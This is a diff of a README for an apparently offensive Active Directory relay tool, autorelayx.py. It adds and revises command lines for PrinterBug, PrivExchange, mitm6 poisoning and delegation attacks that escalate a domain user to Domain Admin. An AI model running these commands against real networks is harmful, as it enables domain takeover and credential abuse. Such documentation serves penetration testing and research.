@@ -43,20 +43,35 @@ Responder and mitm6. The -d <domain> is optional but suggested to use to limit m
 Escalate a domain user that you have the password for to Domain Admin. Script will test the exchange server(s) for 
 vulnerability to SpoolService RPC abuse for the Drop the Mic attack.
 
-```python autorelayx.py --printerbug -dc <domain controller IP/hostname> -u <'DOMAIN/user:password'> -ef <exchange_servers.txt>```
+```python autorelayx.py --printerbug -dc <domain controller IP/hostname> -u <DOMAIN/user:password> -sf <exchange_servers.txt>```
 
-```python autorelayx.py --printerbug -dc <domain controller IP/hostname> -u <'DOMAIN/user:password'> -e <Exchange IP/hostname>```
+```python autorelayx.py --printerbug -dc <domain controller IP/hostname> -u <DOMAIN/user:password> -s <Exchange IP/hostname>```
 
 ## PrivExchange
 Escalate a domain user that you have the password for to Domain Admin.
 
-```python autorelayx.py --privexchange -dc <domain controller IP/hostname> -u <'DOMAIN/user:password'> -e <exchange server IP/hostname>```
+```python autorelayx.py --privexchange -dc <domain controller IP/hostname> -u <DOMAIN/user:password> -s <exchange server IP/hostname>```
 
 ## Passwordless PrivExchange
 If you don't have a domain user's password you can try performing the passwordless PrivExchange attack
 
-```python autorelayx.py --httpattack -e <exchange server IP/hostname>```
+```python autorelayx.py --httpattack -s <exchange server IP/hostname>```
 
 Passwordless PrivExchange attack coupled with mitm6 poisoning on specific domain
 
-```python autorelayx.py --httpattack -e <exchange server IP/hostname> -6 -d <domain for mitm6 to poison>```
+```python autorelayx.py --httpattack -s <exchange server IP/hostname> -6 -d <domain for mitm6 to poison>```
+
+## Delegation
+Requires no domain credentials. Creates a new machine account, prints the username and password of the new machine 
+account, and modifies its delegation rights. Upon success, please use getST.py from impacket to relay the delegation and
+ gain access to the machine account.
+ 
+ ```python autorelayx.py --delegate -dc <domain controller IP/hostname>```
+
+## Domain controller delegation
+Requires 2 domain controllers, at least one of which must be vulnerable to PrinterBug, and a domain user's credentials. 
+Forces the PrinterBug-vulnerable domain controller to authenticate to the attacker which is relayed to the other domain 
+controller. A machine account is created and given delegation rights. Upon success, user can use getST.py from impacket 
+to impersonate a domain admin on the newly created machine.
+
+ ```python autorelayx.py --delegate -dc <domain controller IP/hostname> -s <PrinterBug-vulnerable domain controller> -u <DOM/user:password>```
